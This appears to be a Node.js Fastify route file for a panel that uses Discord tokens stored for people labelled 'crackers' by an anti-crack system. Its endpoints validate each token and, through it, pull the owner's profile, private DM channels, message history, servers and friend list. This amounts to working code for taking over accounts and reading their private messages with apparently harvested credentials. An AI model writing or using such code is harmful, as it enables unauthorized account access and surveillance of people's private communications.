const { discordFetch } = require('../lib/discord');
const { getCrackers, getCrackerById } = require('../lib/anticrack');

async function discordRoutes(fastify) {
  fastify.get('/validate', async (req) => {
    const { id, page = 1, limit = 50, search = '' } = req.query;
    if (id) {
      const cracker = await getCrackerById(parseInt(id));
      if (!cracker || !cracker.discord_token) return { valid: false, user: null };
      try {
        const user = await discordFetch(cracker.discord_token, '/users/@me');
        return { valid: true, user };
      } catch { return { valid: false, user: null }; }
    }
    const data = await getCrackers(parseInt(page), Math.min(parseInt(limit), 100), search);
    const validated = await Promise.all(data.crackers.map(async (c) => {
      if (!c.discord_token) return { ...c, token_valid: false, discord_profile: null };
      try {
        const user = await discordFetch(c.discord_token, '/users/@me');
        return { ...c, token_valid: true, discord_profile: user || null };
      } catch {
        return { ...c, token_valid: false, discord_profile: null };
      }
    }));
    return { crackers: validated, total: validated.length, page: data.page, limit: data.limit, pages: data.pages };
  });

  fastify.get('/user', async (req) => {
    const { id } = req.query;
    const cracker = await getCrackerById(parseInt(id));
    if (!cracker || !cracker.discord_token) return { user: null, cracker };
    try {
      const user = await discordFetch(cracker.discord_token, '/users/@me');
      return { user, cracker };
    } catch {
      return { user: null, cracker };
    }
  });

  fastify.get('/channels', async (req) => {
    const { id } = req.query;
    const cracker = await getCrackerById(parseInt(id));
    if (!cracker || !cracker.discord_token) return { channels: [] };
    try {
      const channels = await discordFetch(cracker.discord_token, '/users/@me/channels');
      return { channels: channels.filter(c => c.type === 1 || c.type === 3) };
    } catch {
      return { channels: [] };
    }
  });

  fastify.get('/messages', async (req) => {
    const { id, channel_id, before, limit = 50 } = req.query;
    const cracker = await getCrackerById(parseInt(id));
    if (!cracker || !cracker.discord_token) return { messages: [] };
    try {
      const params = new URLSearchParams({ limit });
      if (before) params.set('before', before);
      const msgs = await discordFetch(cracker.discord_token, `/channels/${channel_id}/messages?${params}`);
      return { messages: Array.isArray(msgs) ? msgs : [] };
    } catch {
      return { messages: [] };
    }
  });

  fastify.get('/guilds', async (req) => {
    const { id } = req.query;
    const cracker = await getCrackerById(parseInt(id));
    if (!cracker || !cracker.discord_token) return { guilds: [] };
    try {
      const guilds = await discordFetch(cracker.discord_token, '/users/@me/guilds');
      return { guilds: Array.isArray(guilds) ? guilds : [] };
    } catch {
      return { guilds: [] };
    }
  });

  fastify.get('/friends', async (req) => {
    const { id } = req.query;
    const cracker = await getCrackerById(parseInt(id));
    if (!cracker || !cracker.discord_token) return { friends: [] };
    try {
      const friends = await discordFetch(cracker.discord_token, '/users/@me/relationships');
      return { friends: Array.isArray(friends) ? friends : [] };
    } catch {
      return { friends: [] };
    }
  });
}

module.exports = discordRoutes;
